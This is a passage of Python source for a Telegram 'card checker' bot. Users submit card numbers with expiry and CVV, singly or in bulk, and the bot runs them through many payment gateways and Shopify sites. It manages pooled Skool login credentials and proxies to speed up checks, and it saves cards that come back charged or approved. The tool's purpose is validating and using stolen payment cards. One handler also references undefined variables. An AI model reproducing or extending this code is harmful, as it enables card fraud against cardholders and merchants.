        await event.reply(f"Error: {e}")


async def _animate_loading(loading_msg, gate_name):
    spinner = ["\u25dc", "\u25dd", "\u25de", "\u25df"]
    dots = ["", ".", "..", "..."]
    i = 0
    while True:
        try:
            s = spinner[i % 4]
            d = dots[i % 4]
            await loading_msg.edit(f"{s} Checking on **{gate_name}**{d}")
            await asyncio.sleep(0.6)
            i += 1
        except:
            break


@client.on(events.NewMessage(pattern=r'(?i)^[/]addsite\b'))
async def user_add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    try:
        raw_sites_text = ""
        add_text = event.raw_text.split(None, 1)
        has_inline = len(add_text) >= 2 and add_text[1].strip()

        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg and replied_msg.document:
                file_name = getattr(replied_msg.document, 'attributes', [])
                fname = ""
                for attr in file_name:
                    if hasattr(attr, 'file_name'):
                        fname = attr.file_name
                        break
                if fname.lower().endswith('.txt'):
                    file_data = await replied_msg.download_media(bytes)
                    raw_sites_text = file_data.decode("utf-8", errors="ignore")

        if has_inline:
            raw_sites_text += "\n" + add_text[1].strip()

        if not raw_sites_text.strip():
            return await event.reply("**Format:** `/addsite site1.com site2.com`\n\nOr reply to a `.txt` file with `/addsite` to bulk add sites.")

        all_lines = raw_sites_text.replace(",", "\n").replace(" ", "\n").splitlines()
        sites_to_add = []
        rejected_sites = []
        for line in all_lines:
            line = line.strip()
            if not line:
                continue
            # Ensure URL has a scheme for validation
            full_url = line if line.startswith("http") else f"https://{line}"
            err = validate_url(full_url)
            if err:
                rejected_sites.append(line)
                continue
            cleaned = line.replace("https://", "").replace("http://", "").rstrip("/")
            if "." in cleaned and len(cleaned) > 3:
                sites_to_add.append(cleaned)

        if not sites_to_add:
            return await event.reply("No valid sites found!")

        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added = []
        already = []
        for site in sites_to_add:
            if site in user_sites:
                already.append(site)
            else:
                user_sites.append(site)
                added.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        msg = ""
        if added:
            if len(added) <= 30:
                msg += f"**Added ({len(added)}):**\n"
                for s in added:
                    msg += f"`{s}`\n"
            else:
                msg += f"**Added: {len(added)} sites**\n"
                for s in added[:10]:
                    msg += f"`{s}`\n"
                msg += f"... and {len(added) - 10} more\n"
            msg += "\n"
        if already:
            msg += f"**Already Exists: {len(already)}**\n"
            if len(already) <= 10:
                for s in already:
                    msg += f"`{s}`\n"
            msg += "\n"
        if rejected_sites:
            msg += f"**Rejected (invalid URL format): {len(rejected_sites)}**\n"
            for r in rejected_sites[:5]:
                msg += f"`{r}`\n"
            if len(rejected_sites) > 5:
                msg += f"... and {len(rejected_sites) - 5} more\n"
            msg += "\n"
        msg += f"**Your Total Sites:** {len(user_sites)}"
        await event.reply(msg)
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]viewsite$'))
async def user_view_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    try:
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites:
            return await event.reply("You haven't added any sites yet!\n\nUse `/addsite site.com` to add Shopify sites.")
        sites_text = "**Your Sites:**\n\n"
        for idx, site in enumerate(user_sites, 1):
            sites_text += f"{idx}. `{site}`\n"
        sites_text += f"\n**Total:** {len(user_sites)} sites"
        await event.reply(sites_text)
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]rmsite\b'))
async def user_rm_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    try:
        rm_text = event.raw_text.split(None, 1)
        if len(rm_text) < 2 or not rm_text[1].strip():
            return await event.reply("**Format:** `/rmsite site1.com site2.com`")
        sites_to_remove = extract_urls_from_text(rm_text[1].strip())
        if not sites_to_remove:
            return await event.reply("No valid URLs/domains found!")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        removed = []
        not_found = []
        for site in sites_to_remove:
            if site in user_sites:
                user_sites.remove(site)
                removed.append(site)
            else:
                not_found.append(site)
        sites[str(event.sender_id)] = user_sites
        await save_json(SITE_FILE, sites)
        parts = []
        if removed:
            parts.append("**Removed:**\n" + "\n".join(f"`{s}`" for s in removed))
        if not_found:
            parts.append("**Not Found:**\n" + "\n".join(f"`{s}`" for s in not_found))
        parts.append(f"\n**Remaining Sites:** {len(user_sites)}")
        await event.reply("\n\n".join(parts))
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]removeall$'))
async def user_clear_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)
    try:
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        count = len(user_sites)
        if count == 0:
            return await event.reply("You don't have any sites to remove!")
        sites[str(event.sender_id)] = []
        await save_json(SITE_FILE, sites)
        await event.reply(f"**All sites cleared!**\n\nRemoved {count} sites from your database.")
    except Exception as e:
        await event.reply(f"Error: {e}")

SKOOL_ACCOUNTS_FILE = os.path.join(os.path.dirname(__file__), "skool_accounts.json")

@client.on(events.NewMessage(pattern=r'(?i)^[/]addskool\b'))
async def add_skool_account(event):
    is_admin = event.sender_id in ADMIN_ID
    if not is_admin:
        can_access, access_type = await can_use(event.sender_id, event.chat)
        if access_type == "banned": return await event.reply(banned_user_message())
        if not can_access:
            message, buttons = access_denied_message_with_button()
            return await event.reply(message, buttons=buttons)
    try:
        text = event.raw_text.split(None, 1)
        if len(text) < 2:
            return await event.reply("`/addskool email:pass`")
        pairs = text[1].strip().split()
        if is_admin:
            accounts = []
            if os.path.exists(SKOOL_ACCOUNTS_FILE):
                try:
                    with open(SKOOL_ACCOUNTS_FILE, "r") as f:
                        accounts = json.load(f)
                except Exception:
                    accounts = []
            added, updated, skipped = [], [], []
            for pair in pairs:
                if ":" not in pair:
                    skipped.append(pair)
                    continue
                email, password = pair.split(":", 1)
                email, password = email.strip(), password.strip()
                if not email or not password:
                    skipped.append(pair)
                    continue
                existing = next((a for a in accounts if a.get("email") == email), None)
                if existing:
                    if existing.get("password") != password:
                        existing["password"] = password
                        from gates.skool_accounts import _clear_account_status
                        _clear_account_status(email)
                        updated.append(email)
                    else:
                        skipped.append(f"{email} (exists)")
                    continue
                accounts.append({"email": email, "password": password})
                from gates.skool_accounts import _clear_account_status
                _clear_account_status(email)
                added.append(email)
            with open(SKOOL_ACCOUNTS_FILE, "w") as f:
                json.dump(accounts, f, indent=2)
            env_email = os.environ.get("SKOOL_EMAIL", "")
            total = len(accounts) + (1 if env_email and not any(a.get("email") == env_email for a in accounts) else 0)
            msg = ""
            if added:
                msg += f"✅ **{len(added)} Skool Account{'s' if len(added) > 1 else ''} Added**\n\n"
                msg += "**Added:** " + ", ".join(f"`{e}`" for e in added)
            if updated:
                msg += ("\n\n" if msg else "") + f"\U0001f504 **{len(updated)} Account{'s' if len(updated) > 1 else ''} Updated** (new password)\n"
                msg += "**Updated:** " + ", ".join(f"`{e}`" for e in updated)
            if skipped:
                msg += ("\n" if msg else "") + "**Skipped:** " + ", ".join(skipped)
            msg += f"\n\n📊 **Global Accounts** = {total}\n\n"
            msg += "\U0001f4c8 **Tip:** More accounts = faster checks. Each runs independently."
            await event.reply(msg)
        else:
            from gates.skool_accounts import add_user_skool_account, get_user_skool_accounts
            added, updated, skipped = [], [], []
            for pair in pairs:
                if ":" not in pair:
                    skipped.append(pair)
                    continue
                email, password = pair.split(":", 1)
                email, password = email.strip(), password.strip()
                if not email or not password:
                    skipped.append(pair)
                    continue
                ok, reason = add_user_skool_account(event.sender_id, email, password)
                if ok:
                    if reason == "updated":
                        updated.append(email)
                    else:
                        added.append(email)
                else:
                    skipped.append(f"{email} ({reason})")
            total = len(get_user_skool_accounts(event.sender_id))
            msg = ""
            if added:
                msg += f"✅ **{len(added)} Skool Account{'s' if len(added) > 1 else ''} Added**\n\n"
                msg += "**Added:** " + ", ".join(f"`{e}`" for e in added)
            if updated:
                msg += ("\n\n" if msg else "") + f"\U0001f504 **{len(updated)} Account{'s' if len(updated) > 1 else ''} Updated** (new password)\n"
                msg += "**Updated:** " + ", ".join(f"`{e}`" for e in updated)
            if skipped:
                msg += ("\n" if msg else "") + "**Skipped:** " + ", ".join(skipped)
            msg += f"\n\n📊 **Your Accounts** = {total}\n\n"
            msg += "\U0001f4c8 **Tip:** More accounts = faster checks. Each runs independently."
            await event.reply(msg)
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/]viewskool$'))
async def view_skool_accounts(event):
    is_admin = event.sender_id in ADMIN_ID
    if not is_admin:
        can_access, access_type = await can_use(event.sender_id, event.chat)
        if access_type == "banned": return await event.reply(banned_user_message())
        if not can_access:
            message, buttons = access_denied_message_with_button()
            return await event.reply(message, buttons=buttons)
    try:
        if is_admin:
            from gates.skool_accounts import get_all_accounts_with_status, get_all_user_skool_accounts, get_account_status, _load_user_skool_accounts
            accs = get_all_accounts_with_status()
            user_data = _load_user_skool_accounts()

            all_user_accs = []
            for uid, accounts in user_data.items():
                for acc in accounts:
                    email = acc.get("email", "")
                    all_user_accs.append({"email": email, "password": acc.get("password", ""), "owner": uid})

            global_emails = {a["email"] for a in accs}

            if not accs and not all_user_accs:
                return await event.reply("No accounts. Use `/addskool email:pass`")

            lines, buttons = [], []
            all_statuses = []

            if accs:
                lines.append("\U0001f310 **Global Accounts**")
                for i, a in enumerate(accs):
                    email = a["email"]
                    s = a["status"]
                    all_statuses.append(s)
                    icon = "\U0001f7e2" if s == "active" else ("\U0001f534" if s == "dead" else "\u26aa")
                    lines.append(f"{icon} `{email}`")
                    short = email[:20] if len(email) > 20 else email
                    buttons.append([Button.inline(f"\u274c {short}", f"rsg_{i}".encode())])

            if all_user_accs:
                lines.append(f"\n\U0001f465 **User Accounts** ({len(all_user_accs)})")
                per_owner_idx = {}
                for a in all_user_accs:
                    email = a["email"]
                    owner = a.get("owner", "?")
                    s = get_account_status(email)
                    all_statuses.append(s)
                    icon = "\U0001f7e2" if s == "active" else ("\U0001f534" if s == "dead" else "\u26aa")
                    in_global = " \U0001f310" if email in global_emails else ""
                    lines.append(f"{icon} `{email}` \u2014 user `{owner}`{in_global}")
                    short = email[:15] if len(email) > 15 else email
                    if owner not in per_owner_idx:
                        per_owner_idx[owner] = 0
                    idx = per_owner_idx[owner]
                    per_owner_idx[owner] += 1
                    buttons.append([Button.inline(f"\u274c {short} (u:{owner[:8]})", f"rsu_{owner}_{idx}".encode())])

            total = len(accs) + len(all_user_accs)
            active = sum(1 for s in all_statuses if s == "active")
            dead = sum(1 for s in all_statuses if s == "dead")
            status_line = f"\U0001f7e2 {active}  \U0001f534 {dead}"
            msg = f"**All Skool Accounts** ({total})\n{status_line}\n\n" + "\n".join(lines)
            await event.reply(msg, buttons=buttons if buttons else None)
        else:
            from gates.skool_accounts import get_user_skool_accounts, get_account_status
            user_accs = get_user_skool_accounts(event.sender_id)
            if not user_accs:
                return await event.reply("No accounts yet.\n`/addskool email:pass`")
            lines, buttons = [], []
            for i, a in enumerate(user_accs):
                email = a.get("email", "?")
                s = get_account_status(email)
                icon = "\U0001f7e2" if s == "active" else ("\U0001f534" if s == "dead" else "\u26aa")
                lines.append(f"{icon} `{email}`")
                short = email[:20] if len(email) > 20 else email
                buttons.append([Button.inline(f"\u274c {short}", f"msr_{event.sender_id}_{i}".encode())])
            active = sum(1 for a in user_accs if get_account_status(a.get("email","")) == "active")
            dead = sum(1 for a in user_accs if get_account_status(a.get("email","")) == "dead")
            status_line = f"\U0001f7e2 {active}  \U0001f534 {dead}" if (active or dead) else ""
            msg = f"**Your Skool Accounts** ({len(user_accs)})"
            if status_line:
                msg += f"\n{status_line}"
            msg += "\n\n" + "\n".join(lines)
            await event.reply(msg, buttons=buttons)
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.CallbackQuery(pattern=rb'^rsg_'))
async def rsg_inline_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Admin only.", alert=True)
    try:
        idx = int(event.data.decode().replace("rsg_", ""))
    except (ValueError, TypeError):
        return await event.answer("Invalid.", alert=True)
    from gates.skool_accounts import get_all_accounts_with_status
    accs = get_all_accounts_with_status()
    if idx < 0 or idx >= len(accs):
        return await event.answer("Invalid.", alert=True)
    email = accs[idx]["email"]
    accounts = []
    if os.path.exists(SKOOL_ACCOUNTS_FILE):
        try:
            with open(SKOOL_ACCOUNTS_FILE, "r") as f:
                accounts = json.load(f)
        except Exception:
            accounts = []
    remaining = [a for a in accounts if a.get("email", "").lower() != email.lower()]
    if len(remaining) == len(accounts):
        return await event.answer("Not found.", alert=True)
    with open(SKOOL_ACCOUNTS_FILE, "w") as f:
        json.dump(remaining, f, indent=2)
    await event.answer(f"Removed {email}")
    accs = get_all_accounts_with_status()
    if not accs:
        await event.edit("No accounts left.")
        return
    lines, buttons = [], []
    active = sum(1 for a in accs if a["status"] == "active")
    dead = sum(1 for a in accs if a["status"] == "dead")
    unknown = sum(1 for a in accs if a["status"] == "unknown")
    for i, a in enumerate(accs):
        e = a["email"]
        s = a["status"]
        icon = "\U0001f7e2" if s == "active" else ("\U0001f534" if s == "dead" else "\u26aa")
        lines.append(f"{icon} `{e}`")
        short = e[:20] if len(e) > 20 else e
        buttons.append([Button.inline(f"\u274c {short}", f"rsg_{i}".encode())])
    status_line = f"\U0001f7e2 {active}  \U0001f534 {dead}"
    if unknown:
        status_line += f"  \u26aa {unknown}"
    msg = f"**Skool Accounts** ({len(accs)})\n{status_line}\n\n" + "\n".join(lines)
    await event.edit(msg, buttons=buttons)


@client.on(events.CallbackQuery(pattern=rb'^rsu_'))
async def rsu_inline_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Admin only.", alert=True)
    try:
        data = event.data.decode().replace("rsu_", "")
        owner_id, idx_str = data.rsplit("_", 1)
        idx = int(idx_str)
    except (ValueError, TypeError):
        return await event.answer("Invalid.", alert=True)
    from gates.skool_accounts import get_user_skool_accounts, remove_user_skool_account, _clear_account_status
    user_accs = get_user_skool_accounts(int(owner_id))
    if idx < 0 or idx >= len(user_accs):
        return await event.answer("Account not found.", alert=True)
    email = user_accs[idx].get("email", "")
    ok = remove_user_skool_account(int(owner_id), email)
    if not ok:
        return await event.answer("Not found.", alert=True)
    _clear_account_status(email)
    await event.answer(f"Removed {email} from user {owner_id}")
    try:
        await event.edit(f"Removed `{email}` from user `{owner_id}`.\nUse /viewskool to refresh.")
    except:
        pass

@client.on(events.NewMessage(pattern=r'(?i)^[/]rmskool\b'))
async def remove_skool_account(event):
    is_admin = event.sender_id in ADMIN_ID
    if not is_admin:
        can_access, access_type = await can_use(event.sender_id, event.chat)
        if access_type == "banned": return await event.reply(banned_user_message())
        if not can_access:
            message, buttons = access_denied_message_with_button()
            return await event.reply(message, buttons=buttons)
    try:
        text = event.raw_text.split(None, 1)
        if len(text) < 2:
            return await event.reply("`/rmskool email`" + (" or `/rmskool all`" if is_admin else ""))
        target = text[1].strip()
        if is_admin:
            accounts = []
            if os.path.exists(SKOOL_ACCOUNTS_FILE):
                try:
                    with open(SKOOL_ACCOUNTS_FILE, "r") as f:
                        accounts = json.load(f)
                except Exception:
                    accounts = []
            if target.lower() == "all":
                count = len(accounts)
                with open(SKOOL_ACCOUNTS_FILE, "w") as f:
                    json.dump([], f)
                return await event.reply(f"Cleared {count} account(s).")
            removed, remaining = [], []
            for a in accounts:
                if a.get("email", "").lower() == target.lower():
                    removed.append(a.get("email"))
                else:
                    remaining.append(a)
            if not removed:
                return await event.reply(f"`{target}` not found.")
            with open(SKOOL_ACCOUNTS_FILE, "w") as f:
                json.dump(remaining, f, indent=2)
            from gates.skool_accounts import _clear_account_status
            _clear_account_status(removed[0])
            await event.reply(f"Removed `{removed[0]}` ({len(remaining)} left)")
        else:
            from gates.skool_accounts import remove_user_skool_account
            ok = remove_user_skool_account(event.sender_id, target)
            if ok:
                await event.reply(f"Removed `{target}`")
            else:
                await event.reply(f"`{target}` not found.")
    except Exception as e:
        await event.reply(f"Error: {e}")




@client.on(events.CallbackQuery(pattern=rb'^msr_'))
async def msr_inline_cb(event):
    try:
        data = event.data.decode().replace("msr_", "")
        owner_id, idx = data.split("_", 1)
        owner_id, idx = int(owner_id), int(idx)
    except (ValueError, TypeError):
        return await event.answer("Invalid.", alert=True)
    if event.sender_id != owner_id:
        return await event.answer("Not your account.", alert=True)
    from gates.skool_accounts import remove_user_skool_account, get_user_skool_accounts, get_account_status
    user_accs = get_user_skool_accounts(owner_id)
    if idx < 0 or idx >= len(user_accs):
        return await event.answer("Invalid.", alert=True)
    email = user_accs[idx].get("email", "")
    ok = remove_user_skool_account(owner_id, email)
    if not ok:
        return await event.answer("Not found.", alert=True)
    await event.answer(f"Removed {email}")
    user_accs = get_user_skool_accounts(owner_id)
    if not user_accs:
        await event.edit("No accounts left.\n`/addskool email:pass`")
        return
    lines, buttons = [], []
    for i, a in enumerate(user_accs):
        e = a.get("email", "?")
        s = get_account_status(e)
        icon = "\U0001f7e2" if s == "active" else ("\U0001f534" if s == "dead" else "\u26aa")
        lines.append(f"{icon} `{e}`")
        short = e[:20] if len(e) > 20 else e
        buttons.append([Button.inline(f"\u274c {short}", f"msr_{owner_id}_{i}".encode())])
    active = sum(1 for a in user_accs if get_account_status(a.get("email","")) == "active")
    dead = sum(1 for a in user_accs if get_account_status(a.get("email","")) == "dead")
    status_line = f"\U0001f7e2 {active}  \U0001f534 {dead}" if (active or dead) else ""
    msg = f"**Your Skool Accounts** ({len(user_accs)})"
    if status_line:
        msg += f"\n{status_line}"
    msg += "\n\n" + "\n".join(lines)
    await event.edit(msg, buttons=buttons)


# --- Individual Gateway Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/\.]all\b'))
async def all_gateways_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    await register_user(event.sender_id)

    remaining_text = event.raw_text.split(None, 1)[1] if len(event.raw_text.split(None, 1)) > 1 else ""
    card_data = None
    if remaining_text:
        card_data = parse_card_input(remaining_text)
    if not card_data and event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card_data = parse_card_input(replied_msg.text)
            if not card_data:
                cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
                found_in_reply = cc_pattern.findall(replied_msg.text)
                if found_in_reply:
                    card_data = parse_card_input(found_in_reply[0])
    if not card_data:
        return await event.reply("**Usage:** `/all 4111111111111111|12|25|123`")

    cc, mm, yy, cvv = card_data

    if not checkLuhn(cc):
        return await event.reply("Invalid card number (Luhn check failed).")
    if is_bin_banned(cc):
        return await event.reply("This BIN is banned.")

    flat = get_flat_registry()
    skip_types = {"mass"}
    is_admin = event.sender_id in ADMIN_ID
    aliases = [a for a, info in flat.items() if info["type"] not in skip_types and (is_gateway_on(a) or is_admin)]

    if not aliases:
        return await event.reply("No active gateways available.")

    user = await event.get_sender()
    first_name = user.first_name or "User"
    rank = await get_user_rank(event.sender_id)
    brand, bin_type, level, bank, country, flag = await get_bin_info(cc)

    start_time = time.time()
    total = len(aliases)

    header = f"""**ALL GATEWAYS CHECK**

**CC:** `{cc}|{mm}|{yy}|{cvv}`
**BIN:** {brand} - {bin_type} - {level}
**Bank:** {bank}
**Country:** {country} {flag}
"""

    progress_msg = await event.reply(
        header + f"\nChecking **0/{total}** gateways...\n\nStarting..."
    )

    completed_lines = []

    async def edit_progress(current_alias=None, done=False):
        elapsed = round(time.time() - start_time, 2)
        results_text = "\n".join(completed_lines) if completed_lines else ""
        count = len(completed_lines)

        if done:
            status_line = f"\n**Gateways Checked:** {total}\n**Time:** {elapsed}s"
            status_line += f"\n**Req By:** [{first_name}](tg://user?id={event.sender_id}) **[{rank}]**"
            status_line += f"\n**Bot:** {BOT_USERNAME or ADMIN_USERNAME}"
        else:
            status_line = f"\n**Checking {current_alias}...** ({count}/{total}) | {elapsed}s"

        text = header + "\n" + results_text + "\n" + status_line
        try:
            await progress_msg.edit(text)
        except Exception:
            pass

    GATE_TIMEOUT = 40

    for alias in aliases:
        gate_name = flat[alias]["name"]
        await edit_progress(current_alias=alias)

        try:
            resp = await asyncio.wait_for(
                run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID),
                timeout=GATE_TIMEOUT
            )
            if resp == "NO_SKOOL_ACCOUNT":
                loading_task.cancel()
                try: await loading_msg.delete()
                except: pass
                await event.reply(NO_SKOOL_ACCOUNT_MSG)
                return
            status = classify_response(resp)
        except asyncio.TimeoutError:
            resp = "Timed out"
            status = "TIMEOUT"
        except Exception as e:
            resp = str(e)[:120]
            status = "ERROR"

        if status == "CHARGED":
            tag = "CHARGED"
            await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", resp, gate_name, "-", event.sender_id, first_name)
        elif status == "APPROVED":
            tag = "APPROVED"
            await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", resp, gate_name, "-", event.sender_id, first_name)
        elif status == "DECLINED":
            tag = "DECLINED"
        else:
            tag = "ERROR"

        completed_lines.append(f"**{alias}** - {tag} - {resp}")

    await edit_progress(done=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/\.](b3|sa|pp|shp|sk|mau|mb3|vbv|skl|skl1|skl2|ppn|b3c|ch|an|azz|adn|skb|st|rz|cw|charge|sq|isp|auto|bnc|ppk|rbc)\b'))
async def gateway_cmd(event):
    match = re.match(r'[/\.]([\w]+)', event.raw_text)
    if match and match.group(1).lower() == 'auth':
        parts = event.raw_text.split()
        if len(parts) >= 2 and parts[1].isdigit():
            return

    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        message, buttons = access_denied_message_with_button()
        return await event.reply(message, buttons=buttons)

    await register_user(event.sender_id)
    if not match:
        return
    alias = match.group(1).lower()

    flat = get_flat_registry()
    if alias not in flat:
        return await event.reply(f"Unknown gateway: `{alias}`")

    if not is_gateway_on(alias) and event.sender_id not in ADMIN_ID:
        return await event.reply(f"Gateway `{alias}` is currently disabled by admin.")

    if is_gateway_premium(alias) and event.sender_id not in ADMIN_ID:
        is_prem = await is_premium_user(event.sender_id)
        if not is_prem:
            return await event.reply(f"Gateway `/{alias}` requires **Premium** access.")

    if alias == "auto":
        allowed, remaining, used = check_hitter_limit(event.sender_id)
        if not allowed:
            limit = get_hitter_daily_limit(event.sender_id)
            return await event.reply(
                f"⛔ **Daily Hitter Limit Reached**\n\n"
                f"You have used **{used}/{limit}** Auto Hitter runs today.\n"
                f"Upgrade to Silver or Gold for unlimited access.\n\n"
                f"Resets at midnight UTC."
            )
        increment_hitter_usage(event.sender_id)

    remaining_text_raw = event.raw_text[len(match.group(0)):].strip()

    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.document:
            file_name = getattr(replied_msg.document, 'attributes', None)
            doc_name = ""
            if file_name:
                for attr in file_name:
                    if hasattr(attr, 'file_name'):
                        doc_name = attr.file_name or ""
                        break
            if doc_name.endswith('.txt'):
                if not is_mass_check_enabled() and event.sender_id not in ADMIN_ID:
                    return await event.reply("Mass checking is currently disabled by admin.")
                is_prem = await is_premium_user(event.sender_id)
                if event.sender_id not in ADMIN_ID and not is_prem:
                    return await event.reply("Mass checking from files requires **Premium** access.")
                asyncio.create_task(process_mass_gateway(event, replied_msg, alias, flat[alias]["name"]))
                return
        if replied_msg and replied_msg.text and not remaining_text_raw:
            cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
            found_cards = cc_pattern.findall(replied_msg.text)
            if len(found_cards) > 1:
                if not is_mass_check_enabled() and event.sender_id not in ADMIN_ID:
                    return await event.reply("Mass checking is currently disabled by admin.")
                multi_cards = []
                for card_str in found_cards:
                    parsed = parse_card_input(card_str)
                    if parsed:
                        multi_cards.append(parsed)
                if len(multi_cards) > 1:
                    INLINE_MASS_LIMIT = get_inline_mass_limit()
                    if len(multi_cards) > INLINE_MASS_LIMIT:
                        return await event.reply(f"Maximum **{INLINE_MASS_LIMIT}** cards. Found {len(multi_cards)} in replied message.")
                    if alias in ("b3", "b3c"):
                        is_prem = await is_premium_user(event.sender_id)
                        if not is_prem and event.sender_id not in ADMIN_ID:
                            return await event.reply("Mass checking on Braintree gates requires **Premium** access.")

                    is_prem = await is_premium_user(event.sender_id)
                    if event.sender_id not in ADMIN_ID and not is_prem:
                        return await event.reply("Mass checking requires **Premium** access.")

                    user = await event.get_sender()
                    first_name = user.first_name or "User"
                    gate_name = flat[alias]["name"]

                    try:
                        from gates.skool_accounts import get_account_count, get_user_skool_accounts as get_user_skool
                        is_admin_user = event.sender_id in ADMIN_ID
                        if is_admin_user:
                            skool_count = max(get_account_count(), 1)
                        else:
                            user_accts = get_user_skool(event.sender_id)
                            skool_count = len(user_accts) if user_accts else 1
                    except Exception:
                        skool_count = 1
                    concurrency = max(3, min(skool_count, len(multi_cards)))

                    progress_msg = await event.reply(f"**Mass Check - {gate_name}**\nExtracted {len(multi_cards)} cards from reply. Checking... 0/{len(multi_cards)}")

                    q = asyncio.Queue()
                    for card in multi_cards:
                        await q.put(card)

                    results_lines = []
                    checked = [0]
                    charged = [0]
                    approved = [0]
                    declined = [0]
                    errors = [0]

                    async def worker():
                        while True:
                            try:
                                m_cc, m_mm, m_yy, m_cvv = q.get_nowait()
                            except asyncio.QueueEmpty:
                                break
                            cc_str = f"{m_cc}|{m_mm}|{m_yy}|{m_cvv}"
                            if not checkLuhn(m_cc):
                                line = f"\u274c `{cc_str}`\n**Response:** Luhn check failed"
                                declined[0] += 1
                            elif is_bin_banned(m_cc):
                                line = f"\u274c `{cc_str}`\n**Response:** Banned BIN"
                                declined[0] += 1
                            else:
                                try:
                                    gate_timeout = 55 if alias in ("ppn", "pp", "ch", "shp", "bnc", "ppk") else 40
                                    resp = await asyncio.wait_for(
                                        run_gateway(alias, m_cc, m_mm, m_yy, m_cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID),
                                        timeout=gate_timeout
                                    )
                                    resp = resp or "No response"

                                    # Check if auto-remove exhausted all proxies
                                    all_proxies_dead = "[ALL_PROXIES_DEAD]" in resp
                                    if all_proxies_dead:
                                        resp = resp.replace(" [ALL_PROXIES_DEAD]", "")
                                        try:
                                            await event.respond(
                                                "⚠️ **All your proxies have been removed** — they were all dead.\n"
                                                "Use `/scrapeproxy` to grab fresh free proxies or `/setproxy` to add your own."
                                            )
                                        except Exception:
                                            pass

                                    status = classify_response(resp)
                                    resp_clean = clean_response(resp)

                                    if status == "CHARGED":
                                        line = f"\U0001f525 `{cc_str}`\n**Response:** {resp_clean}"
                                        charged[0] += 1
                                        await save_approved_card(cc_str, "CHARGED", resp_clean, gate_name, "-", event.sender_id, first_name)
                                    elif status == "APPROVED":
                                        line = f"\u2705 `{cc_str}`\n**Response:** {resp_clean}"
                                        approved[0] += 1
                                        await save_approved_card(cc_str, "APPROVED", resp_clean, gate_name, "-", event.sender_id, first_name)
                                    elif status == "DECLINED":
                                        line = f"\u274c `{cc_str}`\n**Response:** {resp_clean}"
                                        declined[0] += 1
                                    else:
                                        line = f"\u2753 `{cc_str}`\n**Response:** {resp_clean}"
                                        errors[0] += 1
                                except asyncio.TimeoutError:
                                    _px = get_user_proxy(event.sender_id)
                                    _px_hint = "Your proxy may be dead — /scrapeproxy for free proxies" if _px else "No proxy set — use /scrapeproxy for free proxies"
                                    line = f"\u26a0\ufe0f `{cc_str}`\n**Response:** Timeout\n⚠️ {_px_hint}"
                                    errors[0] += 1
                                except Exception as ex:
                                    line = f"\u26a0\ufe0f `{cc_str}`\n**Response:** {str(ex)[:50]}"
                                    errors[0] += 1

                            results_lines.append(line)
                            checked[0] += 1
                            try:
                                await progress_msg.edit(
                                    f"**Mass Check - {gate_name}**\n"
                                    f"Checking {len(multi_cards)} cards... {checked[0]}/{len(multi_cards)}\n\n"
                                    + "\n\n".join(results_lines[-5:])
                                )
                            except Exception:
                                pass

                    workers = [asyncio.create_task(worker()) for _ in range(concurrency)]
                    await asyncio.gather(*workers)

                    proxy_status = "Live" if get_user_proxy(event.sender_id) else "Not Set"
                    final_msg = (
                        f"**Mass Check Complete - {gate_name}**\n"
                        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                        f"\U0001f525 Charged: **{charged[0]}**\n"
                        f"\u2705 Approved: **{approved[0]}**\n"
                        f"\u274c Declined: **{declined[0]}**\n"
                        f"\u26a0\ufe0f Errors: **{errors[0]}**\n"
                        f"\U0001f4ca Total: **{checked[0]}/{len(multi_cards)}**\n"
                        f"\U0001f310 Proxy \u00bb {proxy_status}\n"
